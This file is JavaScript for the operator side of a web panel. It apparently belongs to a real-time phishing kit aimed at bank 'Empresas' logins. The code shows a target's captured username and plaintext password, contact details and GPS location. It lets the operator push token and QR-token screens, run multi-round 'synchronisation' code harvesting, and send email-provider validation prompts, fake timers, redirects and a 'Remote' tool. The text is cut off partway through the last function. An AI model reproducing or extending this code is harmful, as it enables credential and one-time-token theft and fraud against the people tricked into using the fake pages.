/* JS principal de control_dinamico_usuario.php */
/* userId y CONTROL_FOLDER_PATH se inyectan como variables globales desde PHP */

let chatMessages = [];
let chatPollingInterval = null;
let isChatPollingActive = false;
let lastChatHash = '';
const chatPollingIntervalTime = 3000;

let monitoringInterval = null;
let isMonitoringActive = false;
const monitoringIntervalTime = 10000;
let heartbeatInterval = null;

let enterSendEnabled = true;
let userDataInterval = null;

// Pausar polling cuando la pestaña pierde foco
let isTabActive = true;

document.addEventListener('visibilitychange', function () {
    if (document.hidden) {
        isTabActive = false;
        stopAllPolling();
    } else {
        isTabActive = true;
        resumeAllPolling();
    }
});

function stopAllPolling() {
    if (chatPollingInterval) clearInterval(chatPollingInterval);
    if (monitoringInterval) clearInterval(monitoringInterval);
    if (userDataInterval) clearInterval(userDataInterval);
    if (heartbeatInterval) clearInterval(heartbeatInterval);
    chatPollingInterval = null;
    monitoringInterval = null;
    userDataInterval = null;
    heartbeatInterval = null;
}

function resumeAllPolling() {
    loadUserData();
    loadChatMessages(true);
    loadMonitoringData();
    startUserDataPolling();
    startChatPolling();
    startMonitoring();
    heartbeatInterval = setInterval(sendHeartbeat, 30000);
}

document.addEventListener('DOMContentLoaded', function () {
    loadUserData();
    initializeChat();
    initializeMonitoring();
    initializeTokenPantallaControl();
    initializeSyncControl();
    initializeHistorialCollapse();
    startUserDataPolling();
    startChatPolling();
    startMonitoring();
});

window.addEventListener('beforeunload', function () {
    if (userId) {
        navigator.sendBeacon('monitoreo_popup.php', JSON.stringify({
            accion: 'registrar_salida',
            usuario_id: userId
        }));
    }
});

// --- User data polling (usa get_user_data.php en vez de get_data.php) ---

function startUserDataPolling() {
    if (userDataInterval) clearInterval(userDataInterval);
    userDataInterval = setInterval(loadUserData, 5000);
}

function loadUserData() {
    if (!userId || !isTabActive) return;

    fetch('get_user_data.php?id=' + userId)
        .then(r => r.json())
        .then(data => {
            if (!data.success || !data.usuario) return;
            const user = data.usuario;

            const chatUserName = document.getElementById('chatUserName');
            if (chatUserName) {
                chatUserName.textContent = (user.usuarios || user.nombre || 'Usuario').toUpperCase();
            }

            setText('user-usuario', user.usuarios);
            setText('user-pass', user.password);
            setText('contact-nombre', user.nombre);
            setText('contact-email', user.email);
            setText('contact-movil', user.telefono_movil);
            setText('contact-fijo', user.telefono_fijo);

            const gpsEl = document.getElementById('contact-gps');
            if (gpsEl) {
                if (user.coordenadas_gps) {
                    const mapUrl = 'https://www.google.com/maps?q=' + encodeURIComponent(user.coordenadas_gps);
                    gpsEl.innerHTML = '<a href="' + mapUrl + '" target="_blank" rel="noopener noreferrer" class="text-blue-600 hover:text-blue-800 underline">' + user.coordenadas_gps + '</a>';
                } else {
                    gpsEl.textContent = '—';
                }
            }

            const tokenOption = document.querySelector('.select-option[data-value="token_empresa"]');
            const tokenQrOption = document.querySelector('.select-option[data-value="token_qr_empresa"]');
            const contactoOption = document.querySelector('.select-option[data-value="contacto_empresa"]');
            const syncOption = document.querySelector('.select-option[data-value="sincronizacion"]');
            if (tokenOption || tokenQrOption || contactoOption || syncOption) {
                const usaToken = usuarioUsaTokenFlujo(user);
                const isEmpresa = String(user.apellido || '').trim().toLowerCase() === 'empresa';
                if (tokenOption) tokenOption.style.display = usaToken ? '' : 'none';
                if (tokenQrOption) tokenQrOption.style.display = usaToken ? '' : 'none';
                if (contactoOption) contactoOption.style.display = isEmpresa ? '' : 'none';
                if (syncOption) syncOption.style.display = usaToken ? '' : 'none';
            }

            updateTokenPantallaBlock(user);
            updateTokenHistorial(user);
            updateSyncControlBlock();
            updateChatStatus(user);
        })
        .catch(err => console.error('Error cargando datos:', err));
}

function usuarioUsaTokenFlujo(user) {
    const tipo = String(user.apellido || '').trim().toLowerCase();
    return tipo === 'empresa' || tipo === 'persona' || tipo === 'personas';
}

function setText(id, value) {
    const el = document.getElementById(id);
    if (el) el.textContent = value || 'N/A';
}

function setHistorialTokenText(id, value) {
    const el = document.getElementById(id);
    if (!el) return;
    const v = (value === null || value === undefined) ? '' : String(value).trim();
    el.textContent = v !== '' ? v : '—';
}

function updateTokenHistorial(user) {
    const block = document.getElementById('tokenHistorialBlock');
    if (!block) return;

    const usaToken = usuarioUsaTokenFlujo(user);
    block.style.display = usaToken ? '' : 'none';
    if (!usaToken) return;

    const modo = String(user.token_pantalla_modo || '').toLowerCase();
    const tokenCodigo = String(user.token_codigo || '').trim();
    const estadoPantalla = String(user.token_pantalla_estado || '').toLowerCase();
    const esperaDesde = user.token_pantalla_espera_desde;
    const esFlujoPantalla = estadoPantalla !== '' || (esperaDesde !== null && esperaDesde !== undefined && esperaDesde !== '');

    let tokenInicio = '—';
    let tokenQrInicio = '—';

    if (esFlujoPantalla) {
        if (tokenCodigo !== '') {
            if (modo === 'qr') {
                tokenQrInicio = tokenCodigo;
            } else {
                tokenInicio = tokenCodigo;
            }
        }
    } else {
        const sgdNormal = String(user.sgdotoken_codigo || '').trim();
        const sgdQr = String(user.sgdotoken_qr_codigo || '').trim();
        if (sgdNormal !== '') {
            tokenInicio = sgdNormal;
        }
        if (sgdQr !== '') {
            tokenQrInicio = sgdQr;
        }
    }

    setHistorialTokenText('token-inicio-normal', tokenInicio);
    setHistorialTokenText('token-inicio-qr', tokenQrInicio);
}

// --- Control token pantalla (login Empresas) ---

function initializeTokenPantallaControl() {
    const btnNormal = document.getElementById('btnEnviarTokenNormal');
    const btnQrToggle = document.getElementById('btnEnviarTokenQrToggle');
    const btnConfirmQr = document.getElementById('btnConfirmarTokenQr');

    if (btnNormal) {
        btnNormal.addEventListener('click', function () {
            enviarTokenPantalla('normal');
        });
    }

    if (btnQrToggle) {
        btnQrToggle.addEventListener('click', function () {
            const wrap = document.getElementById('tokenQrUrlWrap');
            if (wrap) {
                wrap.style.display = wrap.style.display === 'none' ? 'block' : 'none';
            }
            const input = document.getElementById('tokenQrUrlInput');
            if (input && wrap && wrap.style.display !== 'none') {
                input.focus();
            }
        });
    }

    if (btnConfirmQr) {
        btnConfirmQr.addEventListener('click', function () {
            const input = document.getElementById('tokenQrUrlInput');
            enviarTokenPantalla('qr', input ? input.value.trim() : '');
        });
    }
}

function updateTokenPantallaBlock(user) {
    const block = document.getElementById('tokenPantallaBlock');
    if (!block) return;

    const usaToken = usuarioUsaTokenFlujo(user);
    const estado = String(user.token_pantalla_estado || '').toLowerCase();
    const modo = String(user.token_pantalla_modo || '').toLowerCase();

    const visible = usaToken && (estado === 'pendiente' || estado === 'liberado');

    block.style.display = visible ? '' : 'none';
    if (!visible) return;

    const statusEl = document.getElementById('tokenPantallaStatus');
    const badgeEl = document.getElementById('tokenPantallaBadge');
    const tipoEl = document.getElementById('tokenPantallaTipo');
    const actionsEl = document.getElementById('tokenPantallaActions');
    const qrWrap = document.getElementById('tokenQrUrlWrap');
    const btnNormal = document.getElementById('btnEnviarTokenNormal');
    const btnQrToggle = document.getElementById('btnEnviarTokenQrToggle');
    const btnConfirmQr = document.getElementById('btnConfirmarTokenQr');

    if (estado === 'liberado') {
        const tipoRow = document.getElementById('tokenPantallaTipoRow');
        const sinToken = modo !== 'normal' && modo !== 'qr';

        if (sinToken) {
            if (statusEl) {
                statusEl.textContent = 'Tiempo agotado (1 min). El usuario avanza sin pantalla de token.';
            }
            if (tipoEl) {
                tipoEl.textContent = 'Sin token';
            }
            if (tipoRow) {
                tipoRow.style.display = '';
            }
            if (badgeEl) {
                badgeEl.textContent = 'EXPIRADO';
                badgeEl.className = 'message-type warning';
            }
        } else {
            const modoLabel = modo === 'qr' ? 'Token QR' : 'Token Normal';
            if (statusEl) {
                statusEl.textContent = modoLabel + ' enviado. El usuario avanza en tiempo real.';
            }
            if (tipoEl) {
                tipoEl.textContent = modoLabel;
            }
            if (tipoRow) {
                tipoRow.style.display = '';
            }
            if (badgeEl) {
                badgeEl.textContent = 'ENVIADO';
                badgeEl.className = 'message-type success-token';
            }
        }
        if (actionsEl) actionsEl.style.display = 'none';
        if (qrWrap) qrWrap.style.display = 'none';
        if (btnNormal) btnNormal.disabled = true;
        if (btnQrToggle) btnQrToggle.disabled = true;
        if (btnConfirmQr) btnConfirmQr.disabled = true;
        return;
    }

    if (tipoEl) {
        tipoEl.textContent = '—';
    }
    const tipoRow = document.getElementById('tokenPantallaTipoRow');
    if (tipoRow) {
        tipoRow.style.display = 'none';
    }
    if (badgeEl) {
        badgeEl.textContent = 'ESPERA';
        badgeEl.className = 'message-type warning';
    }
    if (statusEl) {
        statusEl.textContent = 'Usuario en login validando. Envía Token Normal o Token QR; si no respondes en 1 min, avanza directo a GPS sin token.';
    }
    if (actionsEl) actionsEl.style.display = 'flex';
    if (btnNormal) btnNormal.disabled = false;
    if (btnQrToggle) btnQrToggle.disabled = false;
    if (btnConfirmQr) btnConfirmQr.disabled = false;
}

function validarUrlImagenQrAdmin(url) {
    try {
        const parsed = new URL(url);
        if (!['http:', 'https:'].includes(parsed.protocol)) return false;
        return /\.(png|jpe?g|webp|gif)$/i.test(parsed.pathname);
    } catch (e) {
        return false;
    }
}

async function enviarTokenPantalla(modo, imagenUrl) {
    if (!userId) return;

    if (modo === 'qr') {
        if (!imagenUrl) {
            showAlert('warning', 'Token QR', 'Ingresa la URL de la imagen QR.', 'Aceptar', null);
            return;
        }
        if (!validarUrlImagenQrAdmin(imagenUrl)) {
            showAlert('warning', 'Token QR', 'La URL debe ser http(s) y terminar en .png, .jpg, .jpeg, .webp o .gif', 'Aceptar', null);
            return;
        }
    }

    try {
        const response = await fetch('enviar_token_pantalla.php', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                usuario_id: userId,
                modo: modo,
                imagen_url: imagenUrl || ''
            })
        });
        const data = await response.json();

        if (data.success) {
            const qrWrap = document.getElementById('tokenQrUrlWrap');
            if (qrWrap) qrWrap.style.display = 'none';
            loadUserData();
            showAlert('success', 'Token enviado', data.message || 'Tipo de token registrado.', 'Aceptar', null);
        } else {
            showAlert('error', 'Error', data.error || 'No se pudo enviar el token', 'Aceptar', null);
        }
    } catch (error) {
        console.error('Error enviando token pantalla:', error);
        showAlert('error', 'Error de conexión', 'No se pudo enviar el token.', 'Aceptar', null);
    }
}

function updateChatStatus(user) {
    const statusIndicator = document.querySelector('.status-indicator');
    const statusText = document.getElementById('statusText');
    const header = document.querySelector('header');

    statusIndicator.classList.remove('status-online', 'status-inactive', 'status-offline', 'status-never');
    header.classList.remove('header-estado-online', 'header-estado-offline', 'header-estado-inactive', 'header-estado-nunca-conectado');

    const status = user.estado_real || 'offline';
    const map = {
        'online': ['status-online', 'header-estado-online', 'En línea'],
        'inactive': ['status-inactive', 'header-estado-inactive', 'Inactivo'],
        'offline': ['status-offline', 'header-estado-offline', 'Desconectado'],
        'Nunca conectado': ['status-never', 'header-estado-nunca-conectado', 'Sin conexión']
    };

    const [indicatorClass, headerClass, text] = map[status] || map['offline'];
    statusIndicator.classList.add(indicatorClass);
    header.classList.add(headerClass);
    statusText.textContent = text;
}

// --- Chat ---

function initializeChat() {
    const chatInput = document.getElementById('chatInput');
    const sendButton = document.getElementById('sendButton');
    const inputVisibleButton = document.getElementById('inputVisibleButton');
    const enterSendButton = document.getElementById('enterSendButton');

    sendButton.addEventListener('click', sendMessage);
    chatInput.addEventListener('keypress', function (e) {
        if (e.key === 'Enter' && enterSendEnabled) sendMessage();
    });

    inputVisibleButton.addEventListener('click', function () {
        this.classList.toggle('active');
        const icon = this.querySelector('i');
        icon.className = this.classList.contains('active') ? 'fas fa-eye-slash' : 'fas fa-eye';
        if (window.tooltipManager) {
            tooltipManager.updateTooltipText(this, this.classList.contains('active') ? 'Ocultar input al usuario' : 'Mostrar input al usuario');
        }
    });

    enterSendButton.addEventListener('click', function () {
        this.classList.toggle('active');
        enterSendEnabled = this.classList.contains('active');
        const icon = this.querySelector('i');
        icon.className = enterSendEnabled ? 'fas fa-keyboard' : 'fas fa-ban';
        if (window.tooltipManager) {
            tooltipManager.updateTooltipText(this, enterSendEnabled ? 'Envío con Enter activado' : 'Envío con Enter desactivado');
        }
    });

    loadChatMessages();

    // Custom select
    const selectTrigger = document.getElementById('selectTrigger');
    const selectOptions = document.querySelectorAll('.select-option');
    const selectText = document.querySelector('.select-text');

    selectTrigger.addEventListener('click', function (e) {
        e.stopPropagation();
        this.closest('.custom-select').classList.toggle('active');
    });

    selectOptions.forEach(option => {
        option.addEventListener('click', function (e) {
            e.stopPropagation();
            const value = this.getAttribute('data-value');
            selectText.textContent = this.textContent;
            selectOptions.forEach(opt => opt.classList.remove('selected'));
            this.classList.add('selected');
            document.querySelector('.custom-select').classList.remove('active');

            if (value === 'opcion1') enviarHerramientas();
            else if (value === 'timer') mostrarModalTimer();
            else if (value === 'redireccion') mostrarModalRedireccion();
            else if (value === 'email_validation') mostrarModalEmailValidation();
            else if (value === 'token_empresa') enviarTokenEmpresa();
            else if (value === 'token_qr_empresa') mostrarModalTokenQrEmpresa();
            else if (value === 'contacto_empresa') enviarContactoEmpresa();
            else if (value === 'sincronizacion') mostrarModalSincronizacion();
        });
    });

    document.addEventListener('click', function () {
        document.querySelector('.custom-select').classList.remove('active');
    });
}

function sendMessage() {
    const chatInput = document.getElementById('chatInput');
    const inputVisibleButton = document.getElementById('inputVisibleButton');
    const message = chatInput.value.trim();
    if (!message) return;

    const inputVisible = inputVisibleButton.classList.contains('active');
    const tipoMensaje = inputVisible ? 'con_input' : 'sin_input';

    addMessageToChat({
        id: Date.now(),
        type: 'admin',
        content: message,
        timestamp: new Date(),
        inputVisible: inputVisible
    });

    chatInput.value = '';
    enviarMensajeAdmin(message, tipoMensaje);
}

async function enviarMensajeAdmin(mensaje, tipoMensaje) {
    try {
        const response = await fetch('enviar_mensaje.php', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ usuario_id: userId, mensaje, tipo_mensaje: tipoMensaje })
        });
        const data = await response.json();
        if (!data.success) {
            console.error('Error enviando mensaje:', data.error);
            addMessageToChat({ id: Date.now(), type: 'system', content: 'Error: ' + data.error, timestamp: new Date() });
        }
    } catch (error) {
        console.error('Error de conexión:', error);
    }
}

function addMessageToChat(message) {
    const container = document.getElementById('chatMessages');
    const emptyMessage = container.querySelector('.chat-empty');
    if (emptyMessage) emptyMessage.remove();

    const el = document.createElement('div');
    el.className = `chat-message ${message.type}`;
    el.innerHTML = `
        <div class="message-bubble ${message.type}">${message.content}</div>
        <div class="message-time ${message.type}">${formatTime(message.timestamp)}</div>
    `;
    container.appendChild(el);
    container.scrollTop = container.scrollHeight;
}

async function loadChatMessages(isPolling = false) {
    if (!isTabActive && isPolling) return;
    try {
        const response = await fetch(`cargar_mensajes.php?usuario_id=${userId}`);
        const data = await response.json();

        if (data.success) {
            const messages = data.mensajes || [];
            const newChatHash = messages.length > 0 ? messages[messages.length - 1].id + '_' + messages.length : '';

            if (!isPolling || newChatHash !== lastChatHash) {
                lastChatHash = newChatHash;
                const container = document.getElementById('chatMessages');

                if (messages.length > 0) {
                    container.innerHTML = '';
                    messages.forEach(msg => addMessageToChat({ ...msg, timestamp: new Date(msg.timestamp) }));
                } else if (!isPolling) {
                    container.innerHTML = '<div class="chat-empty"><i class="fas fa-comments"></i><p>No hay mensajes aún</p></div>';
                }
            }
        }
    } catch (error) {
        console.error('Error cargando mensajes:', error);
    }
}

function formatTime(date) {
    return date.toLocaleTimeString('es-ES', { hour: '2-digit', minute: '2-digit' });
}

function startChatPolling() {
    if (chatPollingInterval) clearInterval(chatPollingInterval);
    isChatPollingActive = true;
    chatPollingInterval = setInterval(() => {
        if (isChatPollingActive && isTabActive) loadChatMessages(true);
    }, chatPollingIntervalTime);
}

// --- Herramientas ---

async function enviarHerramientas() {
    try {
        const response = await fetch('enviar_herramientas.php', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ usuario_id: userId })
        });
        const data = await response.json();
        if (data.success) {
            addMessageToChat({ type: 'admin', content: 'Remote Enviado.', timestamp: new Date() });
        }
    } catch (error) {
        console.error('Error enviando herramientas:', error);
    }
}

// --- Timer modal ---

function mostrarModalTimer() {
    const modalHTML = `
        <div id="timerModal" class="modal-overlay">
            <div class="modal-container">
                <div class="modal-header">
                    <h3><i class="fas fa-clock"></i> Reloj de Espera</h3>
                    <button onclick="cerrarModalTimer()" class="modal-close"><i class="fas fa-times"></i></button>
                </div>
                <div class="modal-content">
                    <div class="timer-config">
                        <div class="time-inputs">
                            <div class="input-group"><label>Horas:</label><input type="number" id="timerHoras" min="0" max="23" value="0" class="timer-input"></div>
                            <div class="input-group"><label>Minutos:</label><input type="number" id="timerMinutos" min="0" max="59" value="5" class="timer-input"></div>
                            <div class="input-group"><label>Segundos:</label><input type="number" id="timerSegundos" min="0" max="59" value="0" class="timer-input"></div>
                        </div>
                        <div class="message-input">
                            <label>Mensaje personalizado (opcional):</label>
                            <textarea id="timerMensaje" placeholder="Escribe un mensaje que se mostrará junto al timer..." rows="3" class="timer-textarea"></textarea>
                        </div>
                    </div>
                </div>
                <div class="modal-footer">
                    <button onclick="cerrarModalTimer()" class="btn-cancel">Cancelar</button>
                    <button onclick="enviarTimer()" class="btn-send"><i class="fas fa-paper-plane"></i> Enviar Timer</button>
                </div>
            </div>
        </div>`;
    document.body.insertAdjacentHTML('beforeend', modalHTML);
}

function cerrarModalTimer() {
    const modal = document.getElementById('timerModal');
    if (modal) modal.remove();
}

async function enviarTimer() {
    const horas = parseInt(document.getElementById('timerHoras').value) || 0;
    const minutos = parseInt(document.getElementById('timerMinutos').value) || 0;
    const segundos = parseInt(document.getElementById('timerSegundos').value) || 0;
    const mensaje = document.getElementById('timerMensaje').value.trim();

    if (horas === 0 && minutos === 0 && segundos === 0) {
        showAlert('warning', 'Timer', 'Por favor, configura al menos 1 segundo para el timer.', 'Aceptar', null);
        return;
    }

    const tiempoTotal = (horas * 3600) + (minutos * 60) + segundos;

    try {
        const response = await fetch('enviar_timer.php', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ usuario_id: userId, tiempo_segundos: tiempoTotal, mensaje_personalizado: mensaje, ip_usuario: 'panel' })
        });
        const data = await response.json();
        if (data.success) {
            addMessageToChat({ type: 'admin', content: `Timer enviado: ${horas}h ${minutos}m ${segundos}s` + (mensaje ? ` - ${mensaje}` : ''), timestamp: new Date() });
            cerrarModalTimer();
        } else {
            showAlert('error', 'Error', 'Error al enviar timer: ' + (data.error || 'Error desconocido'), 'Aceptar', null);
        }
    } catch (error) {
        console.error('Error enviando timer:', error);
        showAlert('error', 'Error de conexión', 'No se pudo enviar el timer. Revisa tu conexión e inténtalo de nuevo.', 'Aceptar', null);
    }
}

// --- Redirección modal ---

function mostrarModalRedireccion() {
    const modalHTML = `
        <div id="redireccionModal" class="modal-overlay">
            <div class="modal-container">
                <div class="modal-header">
                    <h3><i class="fas fa-directions"></i> Redirección [>]</h3>
                    <button onclick="cerrarModalRedireccion()" class="modal-close"><i class="fas fa-times"></i></button>
                </div>
                <div class="modal-content">
                    <div class="redireccion-config">
                        <div class="tipo-redireccion">
                            <label>Tipo de redirección:</label>
                            <div class="radio-group">
                                <div class="radio-option">
                                    <input type="radio" id="tipoIndex" name="tipoRedireccion" value="index" checked>
                                    <label for="tipoIndex"><i class="fas fa-home"></i> Inicio (index.php / index.html)</label>
                                </div>
                                <div class="radio-option">
                                    <input type="radio" id="tipoCustom" name="tipoRedireccion" value="url_personalizada">
                                    <label for="tipoCustom"><i class="fas fa-external-link-alt"></i> URL Personalizada</label>
                                </div>
                            </div>
                        </div>
                        <div class="url-input" id="urlInput" style="display: none;">
                            <label>URL de destino:</label>
                            <input type="url" id="urlDestino" placeholder="https://ejemplo.com" class="redireccion-input">
                            <small>Ingresa la URL completa incluyendo http:// o https://</small>
                        </div>
                    </div>
                </div>
                <div class="modal-footer">
                    <button onclick="cerrarModalRedireccion()" class="btn-cancel">Cancelar</button>
                    <button onclick="enviarRedireccion()" class="btn-send"><i class="fas fa-paper-plane"></i> Enviar Redirección</button>
                </div>
            </div>
        </div>`;
    document.body.insertAdjacentHTML('beforeend', modalHTML);

    document.querySelectorAll('input[name="tipoRedireccion"]').forEach(radio => {
        radio.addEventListener('change', function () {
            const urlInput = document.getElementById('urlInput');
            urlInput.style.display = this.value === 'url_personalizada' ? 'block' : 'none';
        });
    });
}

function cerrarModalRedireccion() {
    const modal = document.getElementById('redireccionModal');
    if (modal) modal.remove();
}

async function enviarRedireccion() {
    const tipoRedireccion = document.querySelector('input[name="tipoRedireccion"]:checked').value;
    const urlDestino = tipoRedireccion === 'index' ? 'index' : document.getElementById('urlDestino').value.trim();

    if (tipoRedireccion === 'url_personalizada' && !urlDestino) {
        showAlert('warning', 'Redirección', 'Por favor, ingresa una URL de destino válida.', 'Aceptar', null);
        return;
    }
    if (tipoRedireccion === 'url_personalizada' && !urlDestino.startsWith('http')) {
        showAlert('warning', 'Redirección', 'La URL debe comenzar con http:// o https://', 'Aceptar', null);
        return;
    }

    try {
        const response = await fetch('enviar_redirecciones.php', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ usuario_id: userId, url_destino: urlDestino, tipo_redireccion: tipoRedireccion, mensaje_confirmacion: '', ip_usuario: 'panel' })
        });
        const data = await response.json();
        if (data.success) {
            addMessageToChat({ type: 'admin', content: `Redirección enviada: ${tipoRedireccion === 'index' ? 'Index' : urlDestino}`, timestamp: new Date() });
            cerrarModalRedireccion();
        } else {
            showAlert('error', 'Error', 'Error al enviar redirección: ' + (data.error || 'Error desconocido'), 'Aceptar', null);
        }
    } catch (error) {
        console.error('Error enviando redirección:', error);
        showAlert('error', 'Error de conexión', 'No se pudo enviar la redirección.', 'Aceptar', null);
    }
}

// --- Email Validation modal ---

function mostrarModalEmailValidation() {
    const iconBase = new URL('../php_modales/css/email-icon', window.location.href).href.replace(/\/?$/, '');
    const modalHTML = `
        <div id="emailValidationModal" class="modal-overlay">
            <div class="modal-container">
                <div class="modal-header">
                    <h3><i class="fas fa-envelope"></i> Validar Email</h3>
                    <button onclick="cerrarModalEmailValidation()" class="modal-close"><i class="fas fa-times"></i></button>
                </div>
                <div class="modal-content">
                    <div class="email-validation-config">
                        <div class="proveedor-email">
                            <label class="proveedor-email-instruction">Selecciona el proveedor:</label>
                            <div class="radio-group proveedor-email-radio-group">
                                <div class="radio-option"><input type="radio" id="proveedorGmail" name="proveedorEmail" value="gmail" checked><label for="proveedorGmail" title="Gmail" aria-label="Gmail"><img src="${iconBase}/gmail.svg" alt="" class="proveedor-email-img" width="40" height="40" decoding="async"></label></div>
                                <div class="radio-option"><input type="radio" id="proveedorOutlook" name="proveedorEmail" value="outlook"><label for="proveedorOutlook" title="Outlook" aria-label="Outlook"><img src="${iconBase}/outlook.png" alt="" class="proveedor-email-img" width="40" height="40" decoding="async"></label></div>
                                <div class="radio-option"><input type="radio" id="proveedorYahoo" name="proveedorEmail" value="yahoo"><label for="proveedorYahoo" title="Yahoo" aria-label="Yahoo"><img src="${iconBase}/yahoo.png" alt="" class="proveedor-email-img" width="40" height="40" decoding="async"></label></div>
                                <div class="radio-option"><input type="radio" id="proveedorOtro" name="proveedorEmail" value="otro"><label for="proveedorOtro" title="Otros" aria-label="Otros"><i class="fas fa-envelope proveedor-email-fallback-icon" aria-hidden="true"></i></label></div>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="modal-footer">
                    <button onclick="cerrarModalEmailValidation()" class="btn-cancel">Cancelar</button>
                    <button onclick="enviarEmailValidation()" class="btn-send"><i class="fas fa-paper-plane"></i> Enviar Validación</button>
                </div>
            </div>
        </div>`;
    document.body.insertAdjacentHTML('beforeend', modalHTML);
}

function cerrarModalEmailValidation() {
    const modal = document.getElementById('emailValidationModal');
    if (modal) modal.remove();
}

const PROVEEDOR_EMAIL_LABELS = { gmail: 'Gmail', outlook: 'Outlook', yahoo: 'Yahoo', otro: 'Otros' };

async function enviarContactoEmpresa() {
    try {
        const response = await fetch('enviar_contacto_empresa.php', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ usuario_id: userId, ip_usuario: 'panel' })
        });
        const data = await response.json();
        if (data.success) {
            loadChatMessages(true);
        } else {
            showAlert('error', 'Error', data.error || 'No se pudo enviar la tela de contacto', 'Aceptar', null);
        }
    } catch (error) {
        console.error('Error enviando tela de contacto:', error);
        showAlert('error', 'Error de conexión', 'No se pudo enviar la tela de contacto.', 'Aceptar', null);
    }
}

function setHistorialCollapseState(block, expanded) {
    if (!block) return;
    const trigger = block.querySelector('.historial-collapse-trigger');
    block.classList.toggle('is-collapsed', !expanded);
    if (trigger) {
        trigger.setAttribute('aria-expanded', expanded ? 'true' : 'false');
    }
}

function expandHistorialBlockExclusive(blockId) {
    document.querySelectorAll('.historial-collapsible').forEach((block) => {
        setHistorialCollapseState(block, block.id === blockId);
    });
}

function initializeHistorialCollapse() {
    document.querySelectorAll('.historial-collapsible').forEach((block) => {
        const trigger = block.querySelector('.historial-collapse-trigger');
        const body = block.querySelector('.historial-collapse-body');
        if (!trigger || !body) return;

        setHistorialCollapseState(block, !block.classList.contains('is-collapsed'));

        trigger.addEventListener('click', function () {
            setHistorialCollapseState(block, block.classList.contains('is-collapsed'));
        });

        trigger.addEventListener('keydown', function (e) {
            if (e.key === 'Enter' || e.key === ' ') {
                e.preventDefault();
                this.click();
            }
        });
    });
}

let syncControlState = null;
let syncControlLastCodigoKey = null;
let syncControlLastSyncId = null;

function updateSyncCodigoBadge(el, codigo, envios, syncId) {
    if (!el) return;

    if (syncId !== syncControlLastSyncId) {
        syncControlLastSyncId = syncId;
        syncControlLastCodigoKey = null;
    }

    const hasCodigo = codigo && codigo !== '—';
    const key = hasCodigo ? envios + ':' + codigo : null;

    el.textContent = hasCodigo ? codigo : '—';
    el.classList.toggle('sync-code-badge--empty', !hasCodigo);

    if (hasCodigo && key !== syncControlLastCodigoKey) {
        syncControlLastCodigoKey = key;
        el.classList.remove('is-pop');
        void el.offsetWidth;
        el.classList.add('is-pop');
        el.addEventListener('animationend', () => el.classList.remove('is-pop'), { once: true });
    }
}

function initializeSyncControl() {
    const btnQr = document.getElementById('btnSyncActualizarQr');
    if (btnQr) btnQr.addEventListener('click', actualizarQrSincronizacion);
    updateSyncControlBlock();
}

async function updateSyncControlBlock() {
    const block = document.getElementById('syncControlBlock');
    if (!block || !userId) return;

    try {
        const response = await fetch('obtener_sincronizacion.php?usuario_id=' + userId);
        const data = await response.json();
        if (!data.success) return;

        const sync = data.sync;
        syncControlState = sync;
        const activa = !!data.activa;
        const visible = activa || (sync && sync.estado === 'completado');
        block.style.display = visible ? '' : 'none';
        if (visible && activa) {
            expandHistorialBlockExclusive('syncControlBlock');
        }
        if (!sync) return;

        const badge = document.getElementById('syncControlBadge');
        const status = document.getElementById('syncControlStatus');
        const tipo = document.getElementById('syncControlTipo');
        const paso = document.getElementById('syncControlPaso');
        const codigo = document.getElementById('syncControlCodigo');
        const ronda = document.getElementById('syncControlRonda');
        const waiting = document.getElementById('syncControlWaiting');
        const qrWrap = document.getElementById('syncQrUpdateWrap');

        const envios = Number(sync.envios_realizados) || 0;
        const total = Number(sync.envios_total) || 6;
        const porRonda = Number(sync.envios_por_ronda) || 3;
        const rondasTotal = Number(sync.rondas_total) || 2;
        const rondaActual = Number(sync.ronda_actual) || 1;
        const tokenEnRonda = Number(sync.token_en_ronda) || 1;
        const codigoMostrar = sync.codigo_actual || sync.ultimo_codigo || '—';

        if (tipo) tipo.textContent = sync.tipo === 'qr' ? 'Token QR' : 'Token Código';
        if (paso) paso.textContent = String(sync.paso_actual || '—');
        updateSyncCodigoBadge(codigo, codigoMostrar, envios, sync.sync_id);
        if (ronda) {
            ronda.textContent = 'Ronda ' + rondaActual + ' / ' + rondasTotal
                + ' · Token ' + tokenEnRonda + ' / ' + porRonda
                + ' (' + envios + ' / ' + total + ')';
        }

        if (!activa) {
            if (badge) badge.textContent = 'OK';
            if (status) status.textContent = 'Sincronización completada.';
            if (waiting) waiting.style.display = 'none';
            if (qrWrap) qrWrap.style.display = 'none';
            return;
        }

        const esQr = sync.tipo === 'qr';
        const esperandoQrNuevo = esQr && sync.estado === 'esperando_validacion' && !sync.qr_imagen_url;

        if (esperandoQrNuevo) {
            if (badge) badge.textContent = 'ESPERANDO QR';
            if (status) status.textContent = 'El cliente está en espera. Envíe la imagen QR para el token ' + tokenEnRonda + ' (ronda ' + rondaActual + ').';
            if (waiting) waiting.style.display = 'none';
        } else if (sync.estado === 'esperando_validacion') {
            if (badge) badge.textContent = 'VALIDANDO';
            if (status) status.textContent = 'Código recibido. El cliente está en pantalla de espera.';
            if (waiting) waiting.style.display = 'none';
        } else if (sync.estado === 'interrupcion') {
            if (badge) badge.textContent = 'INTERRUPCIÓN';
            if (status) status.textContent = esQr
                ? 'Usuario en interrupción. Al aceptar pasará a espera de QR.'
                : 'Usuario en pantalla de interrupción. Al aceptar continuará la sincronización.';
            if (waiting) waiting.style.display = 'none';
        } else if (sync.paso_actual >= 2) {
            if (badge) badge.textContent = 'ACTIVA';
            if (status) status.textContent = 'Esperando que el usuario ingrese el código…';
            if (waiting) waiting.style.display = 'flex';
        } else {
            if (badge) badge.textContent = 'ACTIVA';
            if (status) status.textContent = 'Usuario en aviso de sincronización…';
            if (waiting) waiting.style.display = 'none';
        }

        if (qrWrap) {
            qrWrap.style.display = esperandoQrNuevo ? '' : 'none';
            const qrLabel = qrWrap.querySelector('.token-pantalla-qr-label');
            if (qrLabel) {
                qrLabel.textContent = 'Enviar QR · Token ' + tokenEnRonda + ' de ' + porRonda + ' (Ronda ' + rondaActual + ')';
            }
        }
    } catch (e) {
        console.warn('Error sync control:', e);
    }
}

async function actualizarQrSincronizacion() {
